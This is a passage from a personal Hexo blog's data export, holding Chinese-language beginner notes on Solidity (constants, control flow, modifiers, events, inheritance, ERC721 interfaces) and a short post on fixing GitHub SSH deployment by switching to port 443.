所有成员设为其默认值的结构体 0, 0struct Student&#123; uint256 id; uint256 score; &#125;Student public student; 7.3 delete 操作符delete a 会让变量 a 的值变为初始值 12345// delete操作符bool public _bool2 = true; function d() external &#123; delete _bool2; // delete 会让_bool2变为默认值，false&#125; 8. 常数 constant 和 immutabletips： constant（常量）和 immutable（不变量）。状态变量声明这两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明 constant 和 immutable；string 和 bytes 可以声明为constant，但不能为 immutable。 8.1 constant和 immutableconstant constant 变量 必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。 12345// constant变量必须在声明的时候初始化，之后不能改变uint256 constant CONSTANT_NUM = 10;string constant CONSTANT_STRING = &quot;0xAA&quot;;bytes constant CONSTANT_BYTES = &quot;WTF&quot;;address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000; immutable immutable 变量可以在声明时或构造函数中初始化，因此更加灵活 12345// immutable变量可以在constructor里初始化，之后不能改变uint256 public immutable IMMUTABLE_NUM = 9999999999;address public immutable IMMUTABLE_ADDRESS;uint256 public immutable IMMUTABLE_BLOCK;uint256 public immutable IMMUTABLE_TEST; 使用全局变量 address(this), block.number作为值，举例 1234567891011// 利用constructor初始化immutable变量，因此可以利用constructor()&#123; IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test();&#125; function test() public pure returns(uint256)&#123; uint256 what = 9; return(what);&#125; 9.控制流 solidity实现排序算法9.1 控制流solidity 的控制流与其他语言类似，主要有以下几种： 1.if - else 1234567function ifElseTest(uint256 _number) public pure returns(bool)&#123; if(_number == 0)&#123; return(true); &#125;else&#123; return(false); &#125;&#125; 2.for 循环 1234567function forLoopTest() public pure returns(uint256)&#123; uint sum = 0; for(uint i = 0; i &lt; 10; i++)&#123; sum += i; &#125; return(sum);&#125; 3.while循环 123456789function whileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; while(i &lt; 10)&#123; sum += i; i++; &#125; return(sum);&#125; 4.do-while循环 123456789function doWhileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; do&#123; sum += i; i++; &#125;while(i &lt; 10); return(sum);&#125; 5.三元运算符 12345// 三元运算符 ternary/conditional operatorfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123; // return the max of x and y return x &gt;= y ? x: y; &#125; tips: continue（立即进入下一个循环）和 break （结束当前循环）和其他语言类似 9.2 简单的使用solidity实现一个冒泡排序tips： 这里如果 索引变成负数汇报错的，而且数组要加存储位置 如memory 错误如图： 12345678910111213141516171819202122232425// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; function bubSort(uint[] memory arr) external pure returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 10. 构造函数和修饰器tips：有关合约控制权（Ownable） 10.1 构造函数构造函数（constructor）是一种特殊的函数，每一个合约可以定义一个，并在部署合约的时候自动运行一次。它一般用于初始化合约的一些参数，例如初始合约的owner地址： 123456address owner; // 定义owner变量// 构造函数constructor() &#123; owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址&#125; 注意：构造函数在不同的solidity版本中的语法是比不都是一样的，在solidity0.4.22之前，构造函数不使用 constructor 而是使用与合约同名的函数作为构造函数来使用，由于这种旧写法容易使开发者书写时发生疏漏，所以在0.4.22版本之后，采用了construtor写法 构造函数的旧写法： 123456pragma solidity =0.4.21;contract Parents &#123; // 与合约名Parents同名的函数就是构造函数 function Parents () public &#123; &#125;&#125; 10. 2修饰器修饰器（modifier）和 solidity 特有的语法，类似于面向对象编程中的 decorator， 声明函数拥有的特性，并减少代码的冗余。modifier 的主要使用场景时运行函数前的检查，例如地址，变量，余额等 修饰器modifier的定义： 12345// 定义modifiermodifier onlyOwner &#123; require(msg.sender == owner); // 检查调用者是否为owner地址 _; // 如果是的话，继续运行函数主体；否则报错并revert交易&#125; 带有onlyOwner 修饰符的函数只能被 owner 地址调用，如： 123function changeOwner(address _newOwner) external onlyOwner&#123; owner = _newOwner; // 只有owner地址运行这个函数，并改变owner&#125; 解读：changeOwner() 函数，运行它是可以改变合约的owner，但是由于onlyOwner 修饰符的存在，只有原先的owner 可以调用，别人调用都会报错。这是最常用的控制智能合约权限的方法。 OppenZepplin的Ownable 标准实现：oppenzepplin 是一个维护solidity标准化代码库的组织，他的Ownable 标准实现为: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol 演示1： 用当前地址调用test 函数成功： 切换地址调用函数test ，失败 代码： 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Modifier &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; modifier _onlyOwner &#123; require(msg.sender == owner, &quot;You are not owner&quot;); _; &#125; function test() external _onlyOwner &#123; &#125;&#125; 演示2（研究执行顺序）： 我先查看count的值，然后调用，testMod函数，打开交易详情，观察到count的值变成2，再次查看count的值，count &#x3D; 12， 说明 count +&#x3D;10 是在函数testMod 执行之后再执行的 示意图： 11.事件tips：ERC20代币为例（ERC20后面在学，要学会不懂装懂） 11.1 事件solidity的事件（event）是EVM上日志的抽象，它具有连个特点： 响应：应用程序（ether.js）可以通过RPC 接口订阅和监听这些事件，并在前端做响应 经济：事件是EVM 上比较经济的存储数据的方式，每个大概消耗2000gas；相比之下，链上存储一个新变量至少需要20000gas 11.2规则事件的声明由event 关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以ERC20代币合约的Transfer 事件为例： 1event Transfer(address indexed from, address indexed to, uint256 value); 解读： Transfer 事件共记录了3个变量from，to 和 value，分别对应代币的转账地址，接收地址和转账数量 同时from 和 to 前面带着 indexed 关键字，每个indexed标记的变量可以理解为检索事件的索引”键”，在以太坊单独作为一个topic进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址事件。每个事件最多三个带indexed 的变量。每个indexed变量的大小为固定的256比特。事件的哈希以及这三个带有indexed的变量在EVM日志通常被存储为topic。其中topic[0] 是此事件的keccak256 哈希，topic[1] 到 topic[3] 存储了indexed 变量的 keccak256 哈希。 value 和 indexed 关键字，会存储在事件的data部分中，可以理解为事件的”值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般data部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的topic部分中，也是以哈希的方式存储。另外，data部分的变量在存储上消耗的gas相当于topic更少。 我们可以在函数里释放事件。在下面例子中，每次用_transfer() 函数进行转账操作的时候，都会释放Transfer事件，并记录相应的变量 123456789101112131415// 定义_transfer函数，执行转账逻辑function _transfer( address from, address to, uint256 amount) external &#123; _balances[from] = 10000000; // 给转账地址一些初始代币 _balances[from] -= amount; // from地址减去转账数量 _balances[to] += amount; // to地址加上转账数量 // 释放事件 emit Transfer(from, to, amount);&#125; remix上的演示 （我比较菜，我不知道看这个的有什么用，就先不实际操作一番了，以后有点知识储备了再回头来看看） 12. 继承tips：目标：简单继承，多重继承，以及修饰器（modifier）和构造函数（constructor）的继承。 12.1 规则 virtual：父合约中的函数，如果希望子合约重写，需要加上virtual关键字 override：子合约重写了父合约中的函数，需要加上override关键字 12.2 简单的继承先定义一个爷爷合约YeYe，里面包括一个Log事件，和三个function：hip(), pop(), yeye(), 输出都是“爷爷” 12345678910111213141516contract Yeye &#123; event Log(string msg); // 定义3个function: hip(), pop(), man()，Log值为Yeye。 function hip() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function pop() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function yeye() public virtual &#123; emit Log(&quot;Yeye&quot;); &#125;&#125; 再定义一个爸爸合约 BaBa，让他继承YeYe合约，语法就是contract BaBa is YeYe， 非常直观。在BaBa 合约里，我们重写一下hip() 和 pop() 这两个函数，加上 override关键字，并将他们的输出改为 “BaBa”; 并且加上一个新的函数，输出也是”BaBa” 1234567891011121314contract Baba is Yeye&#123; // 继承两个function: hip()和pop()，输出改为Baba。 function hip() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function pop() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function baba() public virtual&#123; emit Log(&quot;Baba&quot;); &#125;&#125; 我们部署合约，可以看出BaBa 合约里有 4 个函数，其中hip() 和 pop() 的输出被陈工改成 “BaBa”, 而继承来的 yeye() 的输出仍是 “YeYe” hip() ： BaBa合约中的yeye函数： 12.3 多重继承规则：继承时要按辈分的高低排。如一个Erzi 合约，继承YeYe 合约和BaBa合约，那么就要写成 contract Erzi is YeYe, BaBa, 而不能写成 contract Erzi is Baba, Yeye , 不然就会报错。如果某个函数在多个继承的合约里都存在，比如 hip() 和 pop() 函数，在子合约里必须重写，不然会报错。重写在多个父合约中都能重名的函数时，override 关键字后面要加上所有父合约名字，例如 &#96;override(YeYe,BaBa)。例： 123456789contract Erzi is Yeye, Baba&#123; // 继承两个function: hip()和pop()，输出值为Erzi。 function hip() public virtual override(Yeye, Baba)&#123; emit Log(&quot;Erzi&quot;); &#125; function pop() public virtual override(Yeye, Baba) &#123; emit Log(&quot;Erzi&quot;); &#125; 在 Erzi 合约中重写了hip() 和 pop() 两个函数，将输出改为 “Erzi”, 并且还分别从YeYe 和 BaBa 合约中继承了 yeye() 和 baba() 两个函数。 12.4 修饰器的继承这个代码修饰器还可以带参数的呀？？？有点惊讶！我得去前面看看 solidity 中的 修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加上viretual 和 override 关键字即可。 123456789101112131415161718192021contract Base1 &#123; modifier exactDividedBy2And3(uint _a) virtual &#123; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); _; &#125;&#125;contract Identifier is Base1 &#123; //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数 function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123; return getExactDividedBy2And3WithoutModifier(_dividend); &#125; //计算一个数分别被2除和被3除的值 function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123; uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); &#125;&#125; Identifier 合约可以直接在代码中使用父合约的 exactDividedBy2And3 修饰器，也可以利用 override 关键字重写修饰器： 1234modifier exactDividedBy2And3(uint _a) override &#123; _; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);&#125; 12.5 构造函数的继承子合约有两种方法继承父合约的构造函数。例如，父合约A里面有一个状态变量a，并由构造函数的参数来确定： 12345678// 构造函数的继承abstract contract A &#123; uint public a; constructor(uint _a) &#123; a = _a; &#125;&#125; 12.5.1 在继承时声明父构造函数的参数，例如：contract B is A(1) 12.5.2 在子合约的构造函数中声明构造函数的参数，例如： 123contract C is A &#123; constructor(uint _c) A(_c * _c) &#123;&#125;&#125; 12.6 调用父合约的函数子合约有两种方式调用父合约的函数，直接调用和利用super 关键字。 12.6.1 直接调用：子合约可以直接用 父合约名. 函数名() 的方式来调用父合约函数，例如 Yeye.pop()。 123function callParent() public&#123; Yeye.pop();&#125; 12.6.2 super 关键字：子合约可以利用super. 函数名() 来调用最近的父合约函数。solidity 继承关系按声明时从左到右的顺序是：contract Erzi is YeYe，BaBa，那么BaBa 是最近的父合约，super.pop() 将调用BaBa.pop() 而不是 YeYe.pop()。 1234function callParentSuper() public&#123; // 将调用最近的父合约函数，Baba.pop() super.pop();&#125; Solidity_day0313. 抽象合约和接口13.1 抽象合约 如果一个智能合约里至少有一个为实现的函数，即某个函数缺少主体{} 中的内容，则必须将该合约标为 abstract ，不然编译就会报错； 另外，未实现的函数需要加 virtual， 以便子合约重写。直接我们写了 个冒泡排序，如果我们还不知道具体的函数体怎么写 即不知道如何是实现冒泡排序，那么可将函数标为 abstract， 之后让别人补写函数的实现过程。 123abstract contract BubSort &#123; function bubSort(uint[] memory a) public pure virtual returns(uint[] memory);&#125; 13.2 接口 接口类似于抽象合约，但它不实现任何功能。接口的规则： a. 不能包含状态变量 b. 不能包含构造函数 c. 不能继承除接口外的其他合约 d. 所有函数都必须 是external 且不能有函数体 e. 继承接口的合约必须实现接口定义的所有功能 虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如ERC20 和 ERC721), 其他Dapps 和智能合约就知道如何与它交互。因为接口提供了两个重要信息： a. 合约里每个函数的 bytes4 选择器，以及基于它们的函数签名 函数名(每个参数类型)。 b. 接口id （暂时还不能理解） 另外，接口和合约 ABI 等价，可以相互转换：编译接口可以得到合约的ABI， 利用 abi-to-sol工具 也可以将 ABI json 文件转换为 接口 sol 文件。 我们用 ERC721 接口合约 IECRC721 为例，它定义了3个 event 和 9 个function， 所有 ERC721 标准的 NFT 都是实现了 这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以 ; 代替了函数体 &#123;&#125; 结尾。 1234567891011121314151617181920212223interface IERC721 is IERC165 &#123; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function getApproved(uint256 tokenId) external view returns (address operator); function setApprovalForAll(address operator, bool _approved) external; function isApprovedForAll(address owner, address operator) external view returns (bool); function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;&#125; 13.3 IERC721 事件IERC721 包含3 个事件，其中 Transfer 和 Approval 事件在 ERC20 中也有。 Transfer 事件： 在转账时被释放，记录代币的发出地址 from，接收to 和 tokenId Approval 事件：在授权时释放：记录授权地址 owner， 被授权地址 approved 和 tokenId ApprovalForAll 事件：在批量授权时释放记录批量授权发出的地址 owner， 被授权地址 operator 和授权与否的 approved。 13.4 IERC721函数 balanceOf：返回某个地址的NFT 持有量 balance ownerOf：返回某tokenId 的主人 owner transferFrom：普通转账，参数为转出地址from，接收地址 to 和tokenId safeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC71Receiver 接口）。参数为转出 from，接收地址 to 和 tokenId approve：授权另一个地址使用你的NFT。参数为被授权地址approve 和 tokenId getApproved：查询tokenId 被批准给了哪个地址 setApprovalForAll：将自己持有的该系列 NFT批量授权给某个地址 operator isApprovedForAll：查询某地址的 NFT 是否批量授权给了另一个 operator 地址 safeTransferFrom：安全转账的重载函数，参数里卖你包含了 data 13.5 什么时候使用接口如果我们知道一个合约实现了 IERC721接口，我们不需要知道它具体代码实现，就可以与它交互。 无聊猿 BAYC 属于ERC721 代币，实现了接口的功能。我们不需要知道他的源代码，只需知道它的合约地址，用 IERC721 接口就可以与它交互，比如用 balanceOf() 来查询某个地址的 BAYC余额，用 safeTransferFrom() 来转账 BAYC. 1234567891011121314contract interactBAYC &#123; // 利用BAYC地址创建接口合约变量（ETH主网） IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D); // 通过接口调用BAYC的balanceOf()查询持仓量 function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123; return BAYC.balanceOf(owner); &#125; // 通过接口调用BAYC的safeTransferFrom()安全转账 function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123; BAYC.safeTransferFrom(from, to, tokenId); &#125;&#125; tips: 顿悟—— 因为之前只学过Java所以脑子里都是Java的思维逻辑，一直不能理解solidity中的使用接口来调用方法，问了学长才知道，他和 Java 不一样，可以自己定义一个接口，只要某个函数实现了该接口的方法，就可以直接通过该接口来调用那个函数！！！！ 13.6 代码测试验证猜想","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"}]},{"title":"hexo d命令出问题","slug":"Hexo/hexo d 命令出问题","date":"2022-12-04T10:25:10.000Z","updated":"2022-12-04T10:25:10.000Z","comments":true,"path":"2022/12/04/Hexo/hexo d 命令出问题/","link":"","permalink":"https://biyouqiuqiu.com/2022/12/04/Hexo/hexo%20d%20%E5%91%BD%E4%BB%A4%E5%87%BA%E9%97%AE%E9%A2%98/","excerpt":"","text":"搭建博客的经历没有想象中的那样一帆风顺，最大的问题出现在hexo d 的部署上，每次都是卡在网络连接超时，在_config.xml文件中修改了 repository的值，将https://github.com/LBiyou/LBiyou.github.io.git 换成：&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#111;&#109;:LBiyou&#x2F;LBiyou.github.io.git 之后，获取公钥然后添加公钥，执行hexo d 就报 remote 什么什么，还有什么exsit之类的。 然后就是 在git 执行 ssh -T &#x67;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109; 这行语句验证是否配置成果，结果报ssh: connect to host github.com port 22: Connection timed out连接超时，然后网上找资料，到 D:\\Git\\Git\\etc\\ssh 下修改ssh_config文件 将 1234567Host ssh.dev.azure.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa# Added by git-extraHost *.visualstudio.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa 配置新的端口号443 1234567Host github.com /* 服务器地址：github.com */User YourEmail /* 用户账号：github上的注册邮箱 */Hostname ssh.github.com /* 服务器地址为github地址*/PreferredAuthentications publickey /* 采用公匙 */IdentityFile ~/.ssh/id_rsa /* 公匙文件路径 */Port 443 /* 端口 */ 参考博客为：[报错： ssh: connect to host github.com port 22: Connection timed out_taotianlucky的博客-CSDN博客](https://blog.csdn.net/qq_31020665/article/details/114113108?ops_request_misc=%7B%22request%5Fid%22%3A%22167030504016800186529240%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=167030504016800186529240&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-114113108-null-null.142^v67^control,201^v4^add_ask,213^v2^t3_control2&amp;utm_term=ssh -t git%40github.com超时&amp;spm&#x3D;1018.2226.3001.4187) 在本机的配置文件为： 123456Host github.com User 3071709373@qq.com Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 修改之后，运行 ssh -T &#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#x6f;&#109; 成功，执行 hexo g hexo d 都成功","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"心得","slug":"心得","permalink":"https://biyouqiuqiu.com/tags/%E5%BF%83%E5%BE%97/"}]}],"categories":[{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"},{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"},{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"},{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"},{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"},{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"},{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"},{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"整数溢出","slug":"整数溢出","permalink":"https://biyouqiuqiu.com/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"},{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"capther总结","slug":"capther总结","permalink":"https://biyouqiuqiu.com/tags/capther%E6%80%BB%E7%BB%93/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"总结","slug":"总结","permalink":"https://biyouqiuqiu.com/tags/%E6%80%BB%E7%BB%93/"},{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://biyouqiuqiu.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"sm.ms","slug":"sm-ms","permalink":"https://biyouqiuqiu.com/tags/sm-ms/"},{"name":"vika","slug":"vika","permalink":"https://biyouqiuqiu.com/tags/vika/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"},{"name":"心得","slug":"心得","permalink":"https://biyouqiuqiu.com/tags/%E5%BF%83%E5%BE%97/"}]}